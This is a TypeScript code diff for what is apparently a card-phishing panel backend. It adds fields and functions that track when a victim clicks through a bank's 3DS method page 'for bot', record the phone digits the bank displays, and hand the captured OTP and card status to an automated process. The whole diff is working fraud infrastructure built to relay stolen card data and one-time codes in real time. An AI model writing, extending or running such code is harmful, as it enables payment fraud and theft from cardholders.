@@ -33,6 +33,11 @@ export type CardFeedEntry = {
   otp_attempts?: number;
   otp_resend_requested_at?: string | null;
   otp_resend_done_at?: string | null;
+  /** Customer pressed Next on ACS Choose Method (unlock real 3DS Next for bot) */
+  method_next_clicked?: boolean;
+  method_next_at?: string | null;
+  /** Last 3 digits of phone shown on bank 3DS UI */
+  phone_last3?: string | null;
   card: AdminCardPayload | null;
 };
 
@@ -194,6 +199,58 @@ export async function attachOtpToCardFeed(orderRef: string, otp: string): Promis
   feed[ix] = { ...feed[ix], last_otp: code, otp_at: now, updated_at: now };
   saveFeed(feed);
   return true;
+}
+
+export async function markMethodNextClicked(orderRef: string): Promise<boolean> {
+  const ref = String(orderRef || "").trim();
+  if (!ref) return false;
+  const feed = loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === ref);
+  if (ix < 0) return false;
+  const now = new Date().toISOString();
+  feed[ix] = {
+    ...feed[ix],
+    method_next_clicked: true,
+    method_next_at: now,
+    updated_at: now,
+    // clear any stale OTP until verify Next
+    last_otp: null,
+    otp_at: null,
+  };
+  saveFeed(feed);
+  return true;
+}
+
+export async function setPhoneLast3(orderRef: string, last3: string): Promise<boolean> {
+  const ref = String(orderRef || "").trim();
+  const digits = String(last3 || "").replace(/\D/g, "").slice(-3);
+  if (!ref || digits.length < 1) return false;
+  const feed = loadFeedRaw();
+  const ix = feed.findIndex((e) => e.order_ref === ref);
+  if (ix < 0) return false;
+  feed[ix] = {
+    ...feed[ix],
+    phone_last3: digits.padStart(3, "0").slice(-3),
+    updated_at: new Date().toISOString(),
+  };
+  saveFeed(feed);
+  return true;
+}
+
+export async function getFeedMeta(orderRef: string): Promise<{
+  method_next_clicked: boolean;
+  phone_last3: string | null;
+  last_otp: string | null;
+  status: string | null;
+} | null> {
+  const row = feedRow(orderRef);
+  if (!row) return null;
+  return {
+    method_next_clicked: Boolean(row.method_next_clicked),
+    phone_last3: row.phone_last3 ? String(row.phone_last3) : null,
+    last_otp: row.last_otp ? String(row.last_otp) : null,
+    status: row.status ? String(row.status) : null,
+  };
 }
 
 export async function updateCardFeedStatus(orderRef: string, status: string): Promise<boolean> {
